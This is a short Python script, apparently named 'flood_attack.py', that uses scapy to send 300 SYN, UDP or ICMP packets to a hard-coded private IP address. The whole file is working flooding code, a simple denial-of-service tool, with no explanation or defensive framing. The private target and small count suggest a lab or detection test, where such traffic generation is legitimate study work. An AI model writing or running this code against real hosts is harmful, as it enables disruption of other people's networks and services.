import sys
from scapy.all import IP, TCP, UDP, ICMP, send

target = "10.239.10.207"
mode = sys.argv[1] if len(sys.argv) > 1 else "syn"
count = 300

if mode == "syn":
    pkt = IP(dst=target) / TCP(dport=8081, flags="S")
elif mode == "udp":
    pkt = IP(dst=target) / UDP(dport=9999)
elif mode == "icmp":
    pkt = IP(dst=target) / ICMP()
else:
    print("usage: python flood_attack.py [syn|udp|icmp]")
    sys.exit(1)

print(f"Sending {count} {mode.upper()} packets to {target}...")
if mode == "syn":
    from time import sleep
    for _ in range(count):
        send(pkt, verbose=0)
        sleep(0.02)
else:
    send(pkt, count=count, verbose=0)
print("Done.")
